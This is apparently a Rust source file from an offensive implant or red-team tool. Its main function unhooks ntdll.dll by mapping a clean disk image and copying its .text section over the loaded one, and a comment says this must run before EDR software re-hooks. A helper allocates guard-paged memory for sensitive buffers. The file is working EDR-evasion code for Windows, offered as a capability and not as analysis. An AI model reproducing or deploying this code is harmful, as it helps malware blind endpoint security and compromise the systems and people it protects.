// ntdll .text unhook: map a clean disk image and overwrite the in-memory .text section.
// Must run early (before EDR re-hooks). Best-effort; failures are non-fatal.

#[cfg(windows)]
pub unsafe fn unhook_ntdll() -> bool {
    use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::memoryapi::{MapViewOfFile, UnmapViewOfFile, VirtualProtect};
    use winapi::um::winbase::CreateFileMappingA;
    use winapi::um::winnt::IMAGE_NT_HEADERS64;
    use winapi::um::winnt::{
        FILE_SHARE_READ, GENERIC_READ, HANDLE, IMAGE_DOS_HEADER, IMAGE_SECTION_HEADER,
        PAGE_EXECUTE_READWRITE, SECTION_MAP_READ, SEC_IMAGE,
    };

    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
    if ntdll.is_null() {
        return false;
    }
    let path = b"\\\\?\\C:\\Windows\\System32\\ntdll.dll\0";
    let h_file: HANDLE = CreateFileA(
        path.as_ptr() as *const i8,
        GENERIC_READ,
        FILE_SHARE_READ,
        std::ptr::null_mut(),
        OPEN_EXISTING,
        0,
        std::ptr::null_mut(),
    );
    if h_file.is_null() || h_file == winapi::um::handleapi::INVALID_HANDLE_VALUE {
        return false;
    }
    let h_map = CreateFileMappingA(
        h_file,
        std::ptr::null_mut(),
        PAGE_EXECUTE_READWRITE | SEC_IMAGE,
        0,
        0,
        std::ptr::null(),
    );
    // SEC_IMAGE requires PAGE_READONLY typically — retry with correct protect
    let h_map = if h_map.is_null() {
        CreateFileMappingA(
            h_file,
            std::ptr::null_mut(),
            0x02 | SEC_IMAGE, // PAGE_READONLY | SEC_IMAGE
            0,
            0,
            std::ptr::null(),
        )
    } else {
        h_map
    };
    if h_map.is_null() {
        CloseHandle(h_file);
        return false;
    }
    let view = MapViewOfFile(h_map, SECTION_MAP_READ, 0, 0, 0);
    if view.is_null() {
        CloseHandle(h_map);
        CloseHandle(h_file);
        return false;
    }

    let base = ntdll as *const u8;
    let clean = view as *const u8;
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D {
        UnmapViewOfFile(view);
        CloseHandle(h_map);
        CloseHandle(h_file);
        return false;
    }
    let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let clean_nt = (clean as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    let nsec = (*nt).FileHeader.NumberOfSections as usize;
    let sec = (nt as *const u8).add(std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;
    let clean_sec = (clean_nt as *const u8).add(std::mem::size_of::<IMAGE_NT_HEADERS64>())
        as *const IMAGE_SECTION_HEADER;

    let mut ok = false;
    for i in 0..nsec {
        let s = &*sec.add(i);
        let name = &s.Name;
        if &name[..5] != b".text" {
            continue;
        }
        let va = s.VirtualAddress as usize;
        let size = *s.Misc.VirtualSize() as usize;
        if size == 0 {
            break;
        }
        let dst = (base as usize + va) as *mut u8;
        let src = (clean as usize + va) as *const u8;
        let mut old = 0u32;
        if VirtualProtect(dst as *mut _, size, PAGE_EXECUTE_READWRITE, &mut old) == 0 {
            break;
        }
        std::ptr::copy_nonoverlapping(src, dst, size);
        let mut dummy = 0u32;
        VirtualProtect(dst as *mut _, size, old, &mut dummy);
        ok = true;
        let _ = clean_sec;
        break;
    }

    UnmapViewOfFile(view);
    CloseHandle(h_map);
    CloseHandle(h_file);
    if ok {
        crate::db_print!("[*] ntdll .text restored from disk image");
    }
    ok
}

#[cfg(not(windows))]
pub fn unhook_ntdll() -> bool {
    false
}

/// Allocate sensitive buffer with PAGE_NOACCESS guard pages (Windows).
#[cfg(windows)]
pub unsafe fn alloc_guarded(size: usize) -> Option<*mut u8> {
    use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_NOACCESS, PAGE_READWRITE};
    let page = 0x1000usize;
    let total = page + ((size + page - 1) / page) * page + page;
    let base = VirtualAlloc(
        std::ptr::null_mut(),
        total,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_NOACCESS,
    );
    if base.is_null() {
        return None;
    }
    let mid = (base as usize + page) as *mut u8;
    let mut old = 0u32;
    if VirtualProtect(mid as *mut _, size.max(page), PAGE_READWRITE, &mut old) == 0 {
        VirtualFree(base, 0, MEM_RELEASE);
        return None;
    }
    Some(mid)
}

#[cfg(not(windows))]
pub unsafe fn alloc_guarded(size: usize) -> Option<*mut u8> {
    let layout = std::alloc::Layout::from_size_align(size, 16).ok()?;
    let p = std::alloc::alloc(layout);
    if p.is_null() {
        None
    } else {
        Some(p)
    }
}
